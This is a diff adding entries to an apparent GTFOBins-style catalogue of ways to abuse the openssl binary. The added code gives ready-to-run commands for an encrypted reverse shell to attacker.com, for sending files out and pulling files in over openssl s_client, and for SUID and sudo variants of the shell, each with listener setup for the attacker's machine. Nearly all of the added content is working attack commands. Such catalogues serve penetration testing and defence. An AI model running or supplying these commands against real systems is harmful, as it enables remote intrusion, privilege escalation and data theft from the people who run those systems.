@@ -1,5 +1,43 @@
 ---
 functions:
+  reverse-shell:
+    - description: |
+        To receive the shell run the following on the attacker box:
+
+            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
+
+        Communication between attacker and target will be encrypted.
+      code: |
+        RHOST=attacker.com
+        RPORT=12345
+        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+  file-upload:
+    - description: |
+        To collect the file run the following on the attacker box:
+
+            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save
+
+        Send a file to a TCP port, transmission will be encrypted.
+      code: |
+        RHOST=attacker.com
+        RPORT=12345
+        LFILE=file_to_send
+        openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT < "$LFILE"
+  file-download:
+    - description: |
+        To send the file run the following on the attacker box:
+
+            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send
+
+        Fetch a file from a TCP port, transmission will be encrypted.
+      code: |
+        RHOST=attacker.com
+        RPORT=12345
+        LFILE=file_to_save
+        openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
   file-write:
     - code: |
         LFILE=file_to_write
@@ -14,11 +52,31 @@ functions:
         LFILE=file_to_read
         openssl enc -in "$LFILE"
   suid:
+    - description: |
+        To receive the shell run the following on the attacker box:
+
+            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
+
+        Communication between attacker and target will be encrypted.
+      code: |
+        RHOST=attacker.com
+        RPORT=12345
+        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+
     - code: |
         LFILE=file_to_write
         echo DATA | openssl enc -out "$LFILE"
   sudo:
-    - code: |
-        LFILE=file_to_write
-        echo DATA | sudo openssl enc -out "$LFILE"
+    - description: |
+        To receive the shell run the following on the attacker box:
+
+            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
+
+        Communication between attacker and target will be encrypted.
+      code: |
+        RHOST=attacker.com
+        RPORT=12345
+        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
 ---
